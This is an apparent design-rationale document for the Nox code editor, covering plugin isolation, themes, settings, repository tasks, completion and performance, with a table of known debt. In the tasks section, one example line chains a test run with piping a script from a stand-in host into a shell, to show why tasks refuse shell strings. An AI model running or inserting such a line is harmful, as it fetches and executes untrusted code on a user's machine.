**Fixing that path uncovered an older bug.** Merging `additionalTextEdits` and
the completion into one transaction was right, since it is one undo, but the
selection kept was the one `insertCompletionText` computed for a document
containing only
the completion. An import merged in above moves everything down and nothing
moved the cursor with it, so **accepting a completion from a server that sends
its imports in the list left the caret inside the import at the top of the
file**. tsserver sends them on `completionItem/resolve` and never hit it;
rust-analyzer, gopls and pyright do not. The fix stops merging two change sets
that describe the same document: the extra edits are applied to a throwaway
state first and the completion is built against that, so `compose` joins them
and no position is mapped by hand. The one position that is mapped, the
completion's start, maps with assoc 1, because an import inserted at offset 0
and a completion starting at offset 0 are the degenerate case, and the default
association puts the completion *before* the import it was meant to accompany.

---

### Plugins are out of process, and that is what makes the gate real

The roadmap's design gate for plugins is that they **must not be able to block
the typing path**. In process, that is a request: a plugin handed a CodeMirror
extension runs on the user's keystrokes and no documentation prevents it. Out
of process there is no seam through which a plugin *could* run per keystroke,
so the gate is a property instead. `AGENT-PLATFORM.md` §6 had already made the
same call for agents, on the grounds that a crash boundary, real capability
enforcement and language independence are "none of which are retrofittable".

The cost is paid rather than hidden: **a plugin cannot hand Nox a CodeMirror
object**, so the roadmap's "editor extensions" becomes a declarative surface,
where the plugin names ranges and Nox owns the render loop, and it is not built
yet.

**Contributions live in `plugin.json`, not in a handshake.** So a plugin's
commands are registered before it has run, and it starts on the first invoke of
one. A handshake would mean starting every installed plugin at launch to find
out what it offers, on an editor whose thesis is starting fast.

**The manifest is read stricter than any other config Nox parses**, and the two
halves differ on purpose. Capabilities are all-or-nothing: one unrecognised
word refuses the manifest, because a trimmed list is a plugin whose declaration
the user read and whose behaviour does not match it. Commands are lenient. A
malformed one grants nothing, so dropping it beats refusing a plugin whose
others are fine.

**Namespacing makes collisions unrepresentable.** A contribution registers as
`plugin.<id>.<name>`: three segments, a fixed first one, and no dots allowed in
either of the others. A contributed id can never equal a core id and two
plugins can never collide, which is why the palette needs no conflict
resolution.

**Both transports are the same interface.** `AgentProcess` was already
documented as knowing nothing about any protocol ("this moves lines"), so a
child process satisfies it as-is and a worker satisfies it behind
`startPluginWorker`. The host branches on neither. That is also why this
landed with **no Rust change**.

Full reasoning, including the two bugs about greetings arriving before anyone
listens, in `docs/superpowers/specs/2026-08-27-plugin-api-design.md`.

---

### A plugin that dies at load is a different failure from a slow one

Added 2026-08-29, after the packaged-build walk measured it at **9.97 s**.

`onExit` settled every outstanding *request* through `#settleAll` and left the
handshake alone, so `#awaitHello` ran to its ten-second deadline even though
the thing it was waiting for had already gone. The most likely cause is also
the most ordinary, a syntax error in a plugin someone is writing, so the
first thing a plugin author met was ten seconds of silence followed by a
sentence blaming them for being slow.

**The fix is in two halves because the exit arrives at two different times,**
and either half alone leaves the other case hanging:

- A worker refused at construction fires `onerror` in the tick it is made, and
  the host subscribes to `onExit` one statement *before* it calls
  `#awaitHello`. There is no waiter yet, so the verdict is **recorded** on the
  entry and read on the way in. That is the exact counterpart of
  `helloVersion`, which exists because greetings arrive early for the same
  reason.
- A plugin that dies part-way through the handshake *does* have a waiter, and
  only settling it will do.

`helloWaiter` therefore takes a **verdict** rather than a version, so anything
that knows the handshake can no longer succeed is able to settle it. And the
two failures get different sentences, *"it stopped before it introduced
itself"* against *"it did not introduce itself in time"*, because they want
different fixes, and a plugin that crashed is not a plugin that is taking its
time.

---

### The config directory gets its own watcher, because it had to

Added 2026-08-28, retiring three debt rows that all said the same thing:
`snippets.json`, `plugin-settings.json` and a theme file each needed a Reload
command after a hand edit, and each named `FileWatcherService`'s single root as
the cause.

**Every one of those rows implied a renderer-side fix, and every one was
wrong.** `nox_watch` holds `Mutex<Option<RecommendedWatcher>>`, one watcher,
and its own comment says *"replacing any previous watcher"*. Calling it for the
config directory would have silently stopped watching the workspace: no
external-change detection, no tree refresh, and no save-overwrite dialog. The
feature would have traded three small gaps for one large one, on the path where
being wrong costs unsaved work.

So it is a third Rust watcher, and the shape was already in the file:
`watchGitMeta` is a second concurrent watch and it did not extend `nox_watch`
into a registry. It added its own state, command pair and event channel. This
follows that rather than refactoring the workspace watcher.

**A separate service, too.** `FileWatcherService`'s whole body is workspace
policy (reload clean buffers, protect dirty ones, refresh the tree, re-index,
warn once per buffer) and none of it applies to a config file.
`ConfigWatcherService` watches, coalesces, and hands out a set of paths;
every decision about what a change *means* stays with the service that owns the
file.

**Self-writes are excluded by content, never by a timer.** Nox writes
`plugin-settings.json` itself on a 250 ms debounce, so a reload that could not
tell its own write from a stranger's would be a loop. The obvious fix is a time
window, "ignore events for a second after we write", and it is the wrong one:
it is a race written down as a constant, and it drops a real external edit that
lands inside it. Instead `reload()` compares the resolved values before and
after and announces only what moved. A byte comparison against `serialize()`
sits in front of it as a fast path; a mutation check confirmed it is *only*
that, since the value comparison catches the same case on its own.

`docs/superpowers/specs/2026-08-28-config-watcher-design.md`.

---

### A theme file is downloaded, so it is read like a manifest

Added 2026-08-28, closing the last open row in the v0.6 table. `DESIGN.md` §9
had said since v0.1 that a theme is a token override rather than a fork; this
is the consequence.

**The threat model is the decision.** Nobody writes a theme from nothing. They
fetch one someone posted and drop it in a folder, exactly as they would a
plugin. So a theme file is content from a stranger that Nox turns into CSS, and
it gets `plugin.json`'s discipline rather than `settings.json`'s. Two
structural consequences, neither a blocklist:

- **The file names a token, never a CSS property.** It says `"bg-editor"` and
  Nox writes the `--nox-` prefix, so no spelling of a theme file reaches a
  property Nox did not choose. `THEME_TOKENS` is 60 names; a key outside it is
  dropped and reported.
- **Nox never builds a CSS rule out of the file.** Values go through
  `CSSStyleDeclaration.setProperty`, so the browser's own parser reads them,
  the same code that reads every other stylesheet, rather than a selector and
  a declaration assembled out of a stranger's JSON. Generating
  `[data-nox-theme='<id>'] { … }` as text would have invented two injection
  points for no gain.

**What is excluded is excluded for a reason, not for tidiness.** Geometry would
let a theme resize the tab bar; stacking would put the palette behind the
editor; typography is already the user's own setting and must not lose to a
file; and `--nox-dur-*` is zeroed under `prefers-reduced-motion`, so a theme
that could set it could quietly defeat an accessibility preference chosen in
the OS.

**`data-nox-theme` carries the base, not the theme.** That is what makes a
three-line theme work: the cascade fills in everything the file did not
mention, and the file's own tokens go on as inline properties, which outrank a
`[data-nox-theme]` rule. It also makes switching back "remove the properties"
rather than "reload a stylesheet", and the removal needs the *previous*
theme's key list, which is unreachable once the setting has changed, so
`#themeProperties` is tracked rather than recomputed.

**`workbench.theme` stopped being an enum because it stopped being closed.**
`pick(['eclipse', 'umbra'])` made the type `'eclipse' | 'umbra'`, which was
true while both themes shipped with the build. `coerce` would now enforce that
falsehood, because an enum rewrites an unrecognised value to its default, so a
custom theme's id would be silently reset to `eclipse` on every load. The setting is a
string, and `Common.optionsFrom` (a *closed* union naming a runtime source) is
what keeps the Settings panel drawing a dropdown without hand-writing a control
for one key.

**An unknown id resolves rather than resetting.** A theme id outlives its file
whenever someone deletes it or opens their settings on another machine; falling
back to the base means putting the file back brings the choice back.

`docs/superpowers/specs/2026-08-28-custom-themes-design.md`.

---

### A plugin's settings are the user's layer, and only ever that

Added 2026-08-28. A plugin declares its options in `plugin.json`. Declared
rather than registered, for the reason panels are: they have to be listable
before the plugin runs, or seeing what a plugin can be configured to do would
mean starting it, and every plugin would start at launch to fill a panel nobody
opened.

**They cannot join `SETTINGS_SCHEMA`, and the reason is the type.** `SettingKey`
is `keyof typeof SETTINGS_SCHEMA` and `Settings` is derived from that, which is
the entire basis of `config.get('editor.fontSize')` being typed rather than
`unknown`. A key discovered at runtime would widen `Settings` to
`Record<string, unknown>` and take every core setting's type down with it. So
the values live in their own `plugin-settings.json`, namespaced by plugin id,
owned by `PluginSettingsService`. That is the house pattern of one file per
subsystem that `snippets.json`, `servers.json` and `keybindings.json` already
follow. The
*validation* is shared rather than copied: `coerce` was split into a schema
lookup in front of a pure `coerceTo(shape, value)`, and a plugin's descriptor
satisfies `SettingShape` structurally, with no cast.

**There is no workspace layer, and no way for an author to ask for one.**
`.nox/settings.json` arrives with a cloned repository, and the schema's
`workspace: true` allowlist works because Nox knows what each of its eight keys
means, and `terminal.shell` is why the list exists. Nox cannot know what a
plugin's keys mean: `formatter.path` and `margin.width` are both a string with
a label. A `workspace: true` a plugin could set would hand the allowlist's
decision to the party it exists to constrain, so the service has one layer by
construction rather than by a check.

**A namespace whose plugin is not loaded is written back untouched.**
`ConfigService` drops unknown keys and is right to, because its schema is
complete, so unknown means stale. Here "known" is whatever discovery found *this launch*, so
dropping would let a manifest that failed to parse this morning, or a folder
renamed mid-upgrade, erase a plugin's configuration on the next unrelated
write. That is a transient failure made destructive, and it is the property
`tests/plugin-settings.test.ts` is built around.

**`settings.changed` carries its values, unlike `document.changed`.** The
document event is coarse because a document is large and the standing rule is
that a plugin is never woken per keystroke. A settings object is a handful of
scalars moving at human speed, so a bare notification would buy only a round
trip. It also never *starts* a plugin. Otherwise touching a row in the
Settings panel would spawn every plugin that declares an option, which is the
lazy activation declared contributions exist to protect.

`docs/superpowers/specs/2026-08-28-plugin-settings-design.md`.

---

### A task from a repository is argv, and is asked about by its argv

Every other config reader in Nox could refuse this problem. Tasks could not.

`.nox/settings.json` arrives with a cloned repository, so its schema carries an
eight-key **allowlist** and `config/schema.ts:20-29` names the reason:
"never anything naming a program, a path or an address. `terminal.shell` is the
reason this list exists." Plugin settings took the same line and paid for it
with a Known debt row, "A project cannot configure a plugin", because Nox
cannot tell an author's `margin.width` from their `formatter.path`. Both refuse
the whole class of key rather than trying to judge one.

A `tasks.json` in a repository *is* that class of key. The row in ROADMAP is
"run **project** commands", so refusing it would have been dropping the row.

**What resolves it is not what the file names but when the naming takes
effect.** `terminal.shell` from a repository is dangerous because it applies
the moment you open a terminal, invisibly, having been read by nobody. A task
does nothing until a person asks for it by name, and that gives Nox a moment,
before anything runs, to show exactly what is about to happen. Consent has
somewhere to go. Two decisions make that moment worth anything.

**argv, never a shell.** A task is a `command` and an `args` array; nothing
reaches `sh -c`, and there is no string form that gets split. This follows
`AgentProcessSpec`, `LanguageServerSpec` and `git.rs`'s "argv-fixed, never a
shell", so it is the house rule rather than a new one, but here it is load
bearing rather than tidy. With a shell string the dialog would print text that
a shell then *reinterprets*: `npm test; curl evil.sh | sh` reads as a test run
at a glance, and quoting, expansion, substitution and globbing all get their
say after the click. With argv there is no second reader, and what the dialog
prints is what `execve` receives, element for element. A confirmation you
cannot fully trust is worse than none, because it launders the thing it was
supposed to check. The cost is real and is not hidden: `npm test && npm run
lint` is two tasks, a pipeline is not a task at all, and the terminal is one
chord away and is a shell on purpose.

**The approval is keyed on the argv, not the task's name.** This is the half
that is easy to get wrong, because keying on the id is the obvious
implementation and reads fine. It would let a repository earn a yes for
`test` meaning `npm test`, then change the file (a pull, a branch switch, the
watcher-driven reload two paragraphs down, none of which anyone is looking at)
and inherit the approval for something else under a name already trusted.
Fingerprinting the argv makes any edit to what a task runs a new question.
`tests/tasks.test.ts` pins it: swapping `taskFingerprint` for `task.id` fails
exactly that one test and leaves the rest green.

**The first version of this key was still wrong, in the other direction**, and
a review on 2026-08-30 found it. It covered the argv and not the *directory*,
and `npm test`, `make` and `cargo test` are argvs whose entire meaning comes
from the directory they run in. So approving `npm test` in a repository you
trust and then opening a stranger's clone in the same window left the approval
standing: same argv, same key, no second question, and the new root's
`package.json` decided what ran. The root is part of the key now, which also
means coming back to the first repository does not ask again. The same review
found the NUL claim was about the wrong layer: `execve` is what cannot carry
one, JSON carries it happily, and two tasks could collide before `parseTasks`
began refusing it. Both are regression-tested, and both were the kind of
mistake that reads as correct because the *shape* of the reasoning was right.

Trust is session-scoped and never written to disk, the granularity
`PermissionService` already offers for "allow for this session", and it is
listed in the panel and dropped by **Forget Approved Tasks** because a grant
you cannot see is a grant you cannot withdraw.

**The gate is the service's, not `PermissionService`'s.** That was the obvious
home and it is the wrong one. `commands.ts:200` guards only when
`principal.kind !== 'user'`, and `AGENT-PLATFORM.md:265` argues the exemption
rather than assuming it: a model that can interrupt a human mid-keystroke is
one they turn off within a day. So the permission model answers "may this agent
make Nox do something". The question here is the other one, and the principal
is the user in both readings of it. `shell.exec` keeps its meaning and its
`deny` default, the task commands declare it so an agent asking for one is
refused exactly as before, and the user's own protection is a smaller thing
that lives in `TaskService`.

Two consequences worth having written down. The user's `tasks.json` is routed
through `classifyConfigChange` and live-reloads, unlike `servers.json` and
`agents.json`, and the line is that re-reading it **starts nothing**: it
changes which commands are listed, and running one is still an act. Nor can a
reload launder an approval, precisely because trust is argv-keyed. And
`tasks.edit` creates the *user's* file only. Nox offering to author a
`.nox/tasks.json` would be Nox helping to write the file the confirmation
exists to catch, and an editor that offers to create it teaches that the file
is ordinary.

### Completion sources are registered, never overridden

`autocompletion()` takes an `override` option, and using it was a defect that
looked like configuration. `override` **replaces** the source list CodeMirror
gathers from language data rather than adding to it
(`@codemirror/autocomplete`, `CompletionState.update`), so
`autocompletion({ override: [lspSource] })` silently switched off every source
the grammar packages register. `lang-html`'s tags and attributes,
`lang-css`'s properties and `lang-javascript`'s locals were all in the bundle,
wired up, and unreachable. The visible symptom was worse than that:
**a file whose language had no server got no completions at all**, which is
most languages, since Nox never spawns a server it was not told about.

The sources now go in through the bare `EditorState.languageData` facet, whose
entries `languageDataAt` merges with whatever the language itself contributes.
Two consequences are worth writing down:

- **The sources are built once, outside the provider.** CodeMirror finds a
  running query by *identity* of the source function. The provider is called on
  every transaction, so constructing sources inside it hands back a new pair
  each time, no in-flight query is ever recognised as its own, and each is
  reset to pending by the transaction that would have delivered its result.
  The picker then never opens: a hang, not a wrong list. This was written
  wrong first and `tests/completion-sources.test.ts` is what caught it.
- **Nothing structural can test this.** Asserting that the html source is
  registered passes with `override` still in place, because `override` is a
  config facet and language data is untouched. Every case in that suite goes
  through the real picker and reads what CodeMirror actually offered.

**The word fallback is a floor, and it stands down twice.** It uses
CodeMirror's own `completeAnyWord`, which caches per rope node so an edit
rescans one chunk. It declines when a language server offers completion for
the document's language. Server items carry `detail`, so CodeMirror's
cross-source dedupe would not collapse a bare word against the same symbol
described properly, and the list would carry both. It also declines above
`WORD_COMPLETION_MAX_BYTES` (§6). A language that brings its own source keeps
the fallback as well: those sources answer in syntactic positions rather than
everywhere, so the overlap is small and the words are what fill the gap.

---

## 6. Performance notes

- **Startup:** grammars are dynamic imports, chunked separately by Vite. Opening
  a file never waits on a parser. The text paints first and highlighting
  arrives on the next tick.
- **Large files:** CodeMirror virtualises the viewport and stores the document
  as a rope, so scroll cost is independent of file size. Files over 64 MB are
  refused (`MAX_FILE_BYTES`); binaries are detected by a NUL byte in the first
  8 KB and refused with a clear message.
- **Search:** match counting stops at 10,000 (`MAX_COUNTED_MATCHES`) and the
  count is shown as `10000+`. Highlighting is viewport-bounded, so a query with
  40,000 hits costs the same as one with three.
- **Quick-open index:** capped at 14,000 files and 12 directory levels, built
  off the main path and abandoned if the root changes mid-walk. The file cap
  was 20,000 until 2026-08-25 and came down on a measurement: scoring that many
  took 80-85% of a 16 ms frame per keystroke on the machine it was measured on,
  which leaves nothing for a slower one. `filetree.ts` carries the curve.
- **Grammar chunks:** one output chunk per grammar, not one for all of them
  (`scripts/chunks.mjs`). The rule returned a single `grammars` name until
  2026-08-26, which collapsed every dynamic import in `editor/languages.ts`
  onto one file. Opening a .json buffer loaded every parser Nox ships, 327 kB
  of it, and adding eleven languages would have made it 640 kB. Now .json
  costs 2 kB and .go costs 31 kB. Rollup still shares a chunk between grammars
  that genuinely embed each other: PHP and Vue really do contain HTML.
- **Word completion:** the fallback declines above 1 MB
  (`WORD_COMPLETION_MAX_BYTES`). `completeAnyWord` caches per rope node, but
  above ~2000 distinct words the *merged* result is never cached, so every
  query re-merges the cached child lists and the cost tracks distinct words.
  Measured over synthetic source text, per query after the first: 0.25 MB
  2-3 ms, 0.5 MB 3-4 ms, 1 MB ~8 ms, 2 MB ~23 ms, 10 MB ~112 ms. The cap is
  where a query still leaves most of a frame, the rule that set quick-open's.
- **The typing path:** a keystroke costs **0.34 ms** in a 16,000-line document
  and the same at 64,000. Measured in chromium, 2026-08-25, best of seven
  batched samples. Flat in document size because every editor extension is
  viewport-bounded; `tests/browser/typing-path.test.ts` is what holds it that
  way, and it catches a per-line document scan at 4.13x against a 3x budget.
- **Fuzzy matching:** an optimal DP rather than a greedy scan. Greedy ranking is
  visibly wrong on paths: typing `path` should not match the scattered
  `p`,`a`,`t`,`h` across `src/core/…`. Inputs are short, so the DP is well
  under a frame across thousands of candidates.
- **Motion budget:** nothing over 190 ms, opacity/transform only, and nothing
  animated on the typing path.

---

## 7. Known debt

Recorded rather than hidden. Each is a deliberate MVP trade.

| Item | Detail |
|---|---|
| Nine defensive initialisers are dead assignments | `no-useless-assignment` is right that the `let x = <value>` opening a `try` in `config/index.ts`, `keymap.ts`, `session.ts`, `updates.ts`, `watcher.ts` and `workspace.ts` is never read, because every path that reaches a use overwrites it first. It is also the thing that stops TypeScript reporting a read before assignment on the early-return paths, so removing it is a change to what the compiler checks, not a tidy-up. Left at warning level in `eslint.config.js` rather than fixed in passing, because three of the nine are in `workspace.ts`, which owns unsaved work. |
| Quick-open's cost is bounded by a cap rather than by the algorithm | The scan is linear in the index and the index is the whole project, so what keeps it inside a frame is `INDEX_MAX_FILES` (14,000, measured, see `filetree.ts`) and the 4,000-survivor break in `fileRows`, not anything about the matcher. Worst realistic query at the cap is ~10 ms of 16 ms. Two consequences worth knowing: a workspace larger than the cap has files quick-open can never find, and the survivor break means `total` is a lower bound and a perfect match late in index order can be missed on a dense query. Removing both needs the scan to become interruptible, chunked across frames, which makes the palette's result path async. |
| The `net.request` gate is one layer, and the other is in Rust | Fixed 2026-08-31: the five commands that can reach the network declare it, `deny` by policy for a non-user principal, and `tests/net-request-gate.test.ts` fails on any capability in the vocabulary that no command declares. What is worth keeping visible is that this is not the only thing standing there. `http.rs`'s `is_loopback` refuses any non-loopback URL and disables proxies, which is what actually bounded the exposure during the whole period the capability was declared by nothing. The two answer different questions, a principal's right to ask versus an address being reachable at all, and ROADMAP's "Later: AI" plans remote model support, which is the change that removes the second one. Whoever makes it should read this row first. |
| A single line from a child is capped at 1 MiB, and the cap is the bound | Fixed 2026-08-31, and the residue is worth naming rather than implying. `LineStream` no longer grows without limit and no longer rescans, so the *reader* is flat. What is still composed downstream is the renderer: `TaskService` keeps 5,000 lines and none of them is length-checked, so a pathological child costs at most 5,000 times the cap rather than an unbounded amount. Bounded was the point; small would be a second decision, and it would want a number chosen against a real agent's largest protocol message rather than against this one. |
| The focus trap is one attribute, and one platform is unchecked | Fixed 2026-08-31 with `inert={modalOpen}` on `.nox-shell`, which works in one place for every dialog including unwritten ones because `Overlays` is a **sibling** of the shell rather than a child. What is worth keeping visible is what the two tests each cover. `tests/modal-inert.test.ts` holds the attribute to the condition for all fourteen modal states, and cannot do more: jsdom implements the `inert` property and none of its behaviour. `e2e/specs/modal-focus.e2e.js` is the behavioural half, and it does **not** press Tab, because measurement showed this harness's synthetic key events do not drive focus navigation on WebKitGTK at all, so a Tab test passed against a build with the fix reverted. It calls `focus()` on every control behind the scrim instead, which is the same property `inert` provides. That leaves one gap: nothing checks that a *real* Tab, from a real keyboard, cannot cross. It rests on `inert` being specified, and on the first case in that spec, which fails on any webview whose `inert` is not the real one. |
| A session grant now costs more prompts than it used to | Fixed 2026-08-31: `grantKey` includes the command id, so a Yes covers the command the dialog named and no other, and `Grant` carries the id and title so the Agents panel lists it in those words. The residue is the price, and it is worth naming because it is the thing that would tempt someone to undo this. An agent using three editing commands on one file is asked three times where it was asked once, and the cheap way to make that go away is to stop naming the command in the prompt, which buys quiet by telling the user less about what they are agreeing to. If the prompting becomes a real complaint, the answer is a coarser *question* asked deliberately ("allow this agent to edit this file", with the commands listed), not a key that is quietly wider than the question. |
| Nothing can tell whether a command *should* declare a capability | Fixed 2026-08-31 for thirteen commands, and the residue is the method rather than the list. The six the review named were joined by seven more of the same kind, found only by reading all 171 by hand: `terminal.focus` opens the panel before it focuses it and so starts a shell, `notes.delete` and `notes.newFromSelection` write, `prefs.reset` rewrites `settings.json`, `search.undoReplace` writes across the project, and `agents.undoLastSession` reverts buffers *and* revokes grants. `view.reloadWindow` declares `permissions.revoke`, which policy denies, because its effect is to erase the in-memory decision log and every grant. What is not fixed is that there is still no way to ask a `run` function whether it reaches the OS. `tests/command-capabilities.test.ts` pins the set of commands declaring nothing, grouped by why, so a new one joins it by a hand edit a reviewer sees, which catches the omission at review rather than at audit. |
| Ten cosmetic toggles write `settings.json` and declare nothing | `view.toggleWordWrap`, `toggleTheme`, the three font-size commands and five more call `ConfigService.set`, which schedules a save, so they do change a file on disk and are in the pinned list rather than declaring `fs.write`. The reason is proportion: each sets a **literal** key to the other value, so between them they reach eight known cosmetic preferences and no path at all, and no command anywhere sets a key chosen at runtime (checked: every `config.set` call site in `app.ts` passes a literal). Telling a user a plugin "wants to change files on disk" for Toggle Word Wrap would be accurate and wildly out of proportion, and the wide-grant objection that used to come with it is gone now that grants key on the command. `prefs.reset` is excluded and declares `fs.write`, because rewriting the whole file is what that phrase actually sounds like. The honest fix is a `settings.write` capability, which is a change to the vocabulary `AGENT-PLATFORM.md` §2.6 keeps deliberately coarse, not to the command table. Found 2026-08-31 while fixing the row above. |
| The token file has a second audience, so it cannot use `color-mix()` | Fixed 2026-08-31: the five literals are tokens, each themeable beside the fill it borders, and `tests/component-css-tokens.test.ts` scans `src/editor` as well as `src/ui`. What is worth recording is the shape the fix could not take. Every one of the five is exactly `--nox-accent`, `--nox-danger` or `--nox-warning` at an alpha, so `color-mix(in srgb, var(--nox-accent) 40%, transparent)` would express that relationship rather than restate it, and would make a theme that moves `accent` carry the whole editor with it for free. `tokens.css` cannot: `TerminalPanel` reads tokens off the document with `getPropertyValue` and hands them to xterm, and a custom property returns its *specified* text, so a `color-mix()` there reaches a consumer that is not a CSS engine. Components may use it freely and ten of them do; the token file is where the values have to stay literal. Anyone tidying `tokens.css` toward `color-mix` should read this first. |
| The gutter order is asserted, and its brittleness is the feature | Fixed 2026-08-31: `tests/browser/blame-gutter.test.ts` names all six columns left to right, sorted by measured `left` rather than read off the DOM, because "blame is outside the code" is a claim about the screen. A second case covers blame switched off, which is the configuration a reader spends most of their time in and the one nothing else there exercises. The residue is that the assertion is a literal sequence, so a seventh gutter fails it. That is deliberate and worth knowing before someone loosens it: a new column's position is a decision, and this is where the person making it gets told. Mutating it also corrected the note that used to be here: moving `blameCompartment` past `staticExtensions()` changes nothing, since every gutter comes from `configured`. |
| Task output is not windowed either | The same row as Problems and References below, and the tasks panel joins them rather than solving it: 5,000 lines of `<div>` is more than either of those will realistically hold. What keeps it survivable is the cap and the 50 ms coalesce, so the DOM is bounded and the repaint rate is bounded, but a task at the cap is 5,000 elements. It is the third caller now, which is the point at which "re-decide on their own merits" starts to look like one shared decision. |
| Task trust does not survive a restart | Deliberate, and the same granularity `PermissionService`'s "allow for this session" has: a grant that outlives the window it was given in is a grant nobody remembers giving. The cost is a repeat question once per session per project task, which is the right price for a first version and the wrong one if someone runs Nox all day across several repositories. Persisting it is a feature rather than a flag: it needs a scope (this argv, in this repository), a viewer, and a way to withdraw one entry, and none of those exist. |
| A fifth panel in the editor slot costs a line in each of the other four | `showAgents`, `showDiff`, `showWelcome` and now `showTasks` each clear the other three by name, so the slot is N-by-N and this change is where it stopped being small. `dismissTop` and `hasDismissible` have the same shape. One `editorLayer: Signal<'review' \| 'agents' \| 'diff' \| 'tasks' \| null>` would collapse all of it, and it is a refactor of four shipped panels rather than something to do while adding the fifth. `tests/overlay-routing.test.ts` covers the overlays and nothing covers this slot, which is the part that would want writing first. |
| Tasks would rather be a bottom panel than an editor one | It takes over the editor area because that is where the width is (`ui.ts:161-164` made the same argument for the agents panel), and watching a build fail *beside* the code that failed is `terminalOpen`'s own argument for sitting below instead. There is no bottom-panel container: `App.svelte` renders `TerminalPanel` and nothing else, with no tab strip and no second slot. Building one is a layout feature, and doing it as a side effect of the tasks row would have made a change about running commands into a change about how panels stack. |
| `agentProcesses` now gates more than agents | `TaskService.available` reads `platform.capabilities.agentProcesses`, because "can this build start a child process" is exactly the question and there is one flag for it. The name is narrower than what it gates: plugins with a `process` transport already borrowed the same method, and tasks are the third caller. Renaming the flag touches `types.ts`, `memory.ts`, `web.ts`, `tauri.ts` and every capability test for no behaviour change, so it is recorded rather than done. |
| Problems and References are not windowed | They share the flat-row shape the explorer and search now window (see §4), but their natural limits are lower. Re-decide on their own merits rather than inheriting the explorer spec's out-of-scope line. |
| Commit is enabled while a merge conflict is unresolved | The panel names conflicts and refuses to stage them, but the Commit button does not know about them. Real git refuses ("committing is not possible because you have unmerged files") and the refusal surfaces through the existing error path, so the outcome is correct and merely late. `MemoryPlatform.gitCommit` does not model the refusal, so nothing tests it. |
| `undoSession` still revokes grants as a side effect | Revocation is its own command now (`permissions.revokeGrants`), so undoing an agent's *work* arguably should leave its *permissions* alone. The two are still welded in `agent/runtime.ts`; the panel's toast says so rather than surprising the user. |
| The explorer does not dim gitignored files | `git.rs` runs `--porcelain=v2 --branch -z` without `--ignored`, so the `!` records never arrive. Real support is a Rust change plus a Platform-boundary change, not a component one. |
| A save can still refresh the whole tree | FSEvents flags are sticky per path, so an in-place rewrite of a file renamed earlier in the session arrives as `Modify(Name(_))` and is classified a rename; Nox's own atomic save adds a `Create` and three renames of its own. The event kind cannot tell a sticky flag from a real rename, only re-reading the tree can, so the fix belongs in `FileTreeService.refresh()` reporting whether anything actually changed. |
| The quick-open index still starves during a sustained write storm | The 1 s coalesce ceiling bounds the *flush*, but each structural flush resets `REINDEX_MS`, so the project re-walk still waits for the storm to end. Deliberate, since the full walk is the expensive one, but worth revisiting. |
| `search_integration.rs` re-types the walker configuration | Its `walk()` helper is a hand-copy of `search.rs`'s builder with a truncated exclude list and no include handling, which is why four integration tests passed throughout both search defects. Importing the real `plan_walk` needs `pub mod search` in `lib.rs`. |
| The browser search walks `node_modules` and `.git` | `MemoryPlatform.searchProject` applies no always-exclude list, so the dev target searches machine directories the desktop build prunes. Divergence in the harmless direction, but it is the fake being wrong. |
| Dirty flag on huge files | See §4. Above 2 MB, undo-to-saved leaves the tab dirty. |
| Watch mtime resolution | See §4. A coarse-mtime filesystem can let an external write in the same second as a save be misread as our own. |
| Watch is root-only | Files opened outside the workspace root are not watched. One watcher, one root. **A file in that state also never leaves `externalState: 'none'`, so the save-overwrite dialog never fires for it**, and a concurrent edit is clobbered rather than reported. |
| Folds are not persisted across sessions | Fold state lives in the buffer's `EditorState`, so it survives tab switches but not a restart. Cursor positions *are* persisted: see §4. |
| A damaged config file is preserved, but never repaired | `<name>.damaged.<ext>` is a copy, not a merge: Nox does not attempt to recover the *contents* of an index it could not parse, only the one counter that stops the next write destroying a body file. Recovering a truncated `notes.json`'s rows is possible and unbuilt. |
| An excluded match is identified by line and column | So an edit that moves a *different* match onto exactly that line and column excludes that one instead, by deleting a line above a match whose column happens to align. Bounded in the safe direction: the run still replaces only what the pattern finds, and the exclusion still lands on a match the user could see. What it can get wrong is *which*. Anything less locatable is refused outright. A richer key needs a definition of "the same match across an edit", which is position mapping, which the results do not have. They came from disk and the replace may read a buffer. |
| A UTF-16 file with no byte-order mark gains one when saved | Nox writes UTF-16 with a mark always, because `detect` knows UTF-16 by nothing else and mark-less little-endian ASCII reads as UTF-8 full of NULs, a file it could never reopen. Only reachable by choosing the charset by hand, since nothing detects mark-less UTF-16 in the first place. Modelling "UTF-16 without a mark" would need a seventh label carried through the IPC boundary, the status bar, the picker and the session record, to preserve a shape whose endianness is a guess anyway. |
| The word fallback is capped by size, not by work | It declines above 1 MB (§6) rather than scanning an interruptible slice, so a large file gets no word completions at all instead of the ones near the caret. Bounded in the harmless direction, since the fallback is a convenience and a language server, where there is one, is unaffected, but the honest fix is a bounded scan around the viewport rather than a cliff. `completeAnyWord` offers no way to ask for one, and it would mean Nox owning the scan. |
| A plugin's decorations are carried forward, not recomputed | Between one keystroke and the next Nox maps a plugin's `RangeSet` through the change rather than asking the plugin again, because it is in another process and cannot answer that fast. So a mark stays over its text while you type and is corrected on the next `document.changed`, which means there is a window where a mark is *positioned* correctly and no longer *true*. The alternative is marks that vanish on the first keystroke, which is worse. |
| Plugins get two events, not a feed | `document.changed` (2026-08-27) is debounced at 400 ms, coarse ("this buffer changed", never what changed), and sent **only to plugins that have already decorated that buffer**, and that last clause is what stops it being an ambient feed. `settings.changed` (2026-08-28) joins it and is not comparable: it fires when a human moves a control, carries the new values, and reaches only a plugin that is *already running*. There is still no selection or focus event, and a status item still cannot track the editor live. `examples/plugins/counter/` says so rather than implying otherwise. |
| A plugin setting cannot hold a secret | Built 2026-08-28 as four scalar kinds in a plaintext `plugin-settings.json`, so a plugin wanting an API key gets a string setting in a file anyone can read, exactly as `servers.json` and `agents.json` already do. Nox has no keychain seam and adding one would be its own feature, not a kind. Recorded rather than implied, because a `"kind": "string"` labelled *Token* looks like somewhere safe to put one. |
| A project cannot configure a plugin | Deliberate, and the one thing plugin settings refuse. `.nox/settings.json` arrives with a cloned repository, and the schema's `workspace: true` allowlist works only because Nox knows what each of its eight keys means. It cannot know what a plugin's keys mean, since `formatter.path` and `margin.width` are both a string with a label, so no plugin setting is ever workspace-scoped and there is no flag an author could set to make one. The cost is real: a repository cannot ship its linter plugin's configuration with itself. See `docs/superpowers/specs/2026-08-28-plugin-settings-design.md` §0. |
| A custom theme is not held to any contrast floor | `tests/token-contrast.test.ts` holds Nox's own tokens to WCAG 4.5:1 and keeps doing so. A theme a user writes is checked for *shape* and never for legibility. Deliberate, because refusing to load someone's theme over a comment colour measuring 4.2:1 would be Nox overruling a person about their own screen, but it means the guarantee that suite provides covers the built-in themes only, which is worth saying rather than leaving implied. |
